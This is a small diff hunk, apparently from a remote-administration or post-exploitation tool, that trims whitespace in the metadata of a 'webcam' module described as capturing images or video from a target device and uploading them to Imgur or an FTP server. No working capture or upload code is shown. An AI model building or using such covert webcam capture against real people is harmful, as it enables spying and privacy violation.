@@ -26,7 +26,7 @@ results = {}
 packages  = ['cv2']
 platforms = ['win32','linux2','darwin']
 usage = 'webcam <imgur/ftp>'
-description = """ 
+description = """
 Capture image/video from target device's webcam and
 optionally upload it to Imgur or a remote FTP server
 """
